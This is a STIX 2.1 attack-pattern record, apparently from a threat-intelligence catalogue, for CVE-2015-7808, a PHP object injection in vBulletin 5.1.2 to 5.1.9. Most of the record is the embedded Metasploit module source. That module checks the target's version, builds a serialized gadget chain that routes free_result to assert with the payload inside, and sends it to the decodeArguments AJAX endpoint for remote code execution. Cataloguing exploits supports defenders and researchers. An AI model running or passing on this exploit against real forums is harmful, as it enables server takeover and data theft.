{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--adac348e-1938-4c46-add0-957f09d363de",
    "created": "2024-08-14T17:08:21.264219Z",
    "modified": "2024-08-14T17:08:21.264223Z",
    "name": "vBulletin 5.1.2 Unserialize Code Execution",
    "description": " This module exploits a PHP object injection vulnerability in vBulletin 5.1.2 to 5.1.9  'Platform'       => 'php' 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vbulletin_unserialize.rb",
            "external_id": "vbulletin_unserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7808"
        },
        {
            "source_name": "reference",
            "url": "http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq"
        },
        {
            "source_name": "reference",
            "url": "http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vBulletin 5.1.2 Unserialize Code Execution',\n      'Description'    => %q{\n        This module exploits a PHP object injection vulnerability in vBulletin 5.1.2 to 5.1.9\n      },\n      'Platform'       => 'php',\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'Netanel Rubin',  # reported by\n          'cutz',  # original exploit\n          'Julien (jvoisin) Voisin',  # metasploit module\n      ],\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x22\",\n        },\n      'References'     =>\n        [\n          ['CVE', '2015-7808'],\n          ['EDB', '38629'],\n          ['URL', 'http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq'],\n          ['URL', 'http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/']\n        ],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n          ['vBulletin 5.0.X', {'chain' => 'vB_Database'}],\n          ['vBulletin 5.1.X', {'chain' => 'vB_Database_MySQLi'}],\n      ],\n      'DisclosureDate' => '2015-11-04',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/\"])\n        ])\n  end\n\n  def check\n      begin\n          res = send_request_cgi({ 'uri' => target_uri.path })\n          if (res && res.body.include?('vBulletin Solutions, Inc.'))\n              if res.body.include?(\"Version 5.0\")\n                  @my_target = targets[1] if target['auto']\n                  return Exploit::CheckCode::Appears\n              elsif res.body.include?(\"Version 5.1\")\n                  @my_target = targets[2] if target['auto']\n                  return Exploit::CheckCode::Appears\n              else\n                  return Exploit::CheckCode::Detected\n              end\n          end\n      rescue ::Rex::ConnectionError\n          return Exploit::CheckCode::Safe\n      end\n  end\n\n  def exploit\n    print_status(\"Trying to inferprint the instance...\")\n\n    @my_target = target\n    check_code = check\n\n    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to detect a vulnerable instance\")\n    end\n\n    if @my_target.nil? || @my_target['auto']\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to auto detect, try setting a manual target...\")\n    end\n\n    print_status(\"Exploiting #{@my_target.name}...\")\n\n    chain = 'O:12:\"vB_dB_Result\":2:{s:5:\"*db\";O:'\n    chain << @my_target[\"chain\"].length.to_s\n    chain << ':\"'\n    chain << @my_target[\"chain\"]\n    chain << '\":1:{s:9:\"functions\";a:1:{s:11:\"free_result\";s:6:\"assert\";}}s:12:\"*recordset\";s:'\n    chain << \"#{payload.encoded.length}:\\\"#{payload.encoded}\\\";}\"\n\n    chain = Rex::Text.uri_encode(chain)\n    chain = chain.gsub(/%2a/, '%00%2a%00')  # php and Rex disagree on '*' encoding\n\n    send_request_cgi({\n        'method' => 'GET',\n        'uri'       => normalize_uri(target_uri.path, 'ajax/api/hook/decodeArguments'),\n        'vars_get' => {\n            'arguments' => chain\n      },\n       'encode_params' => false,\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-11-04"
}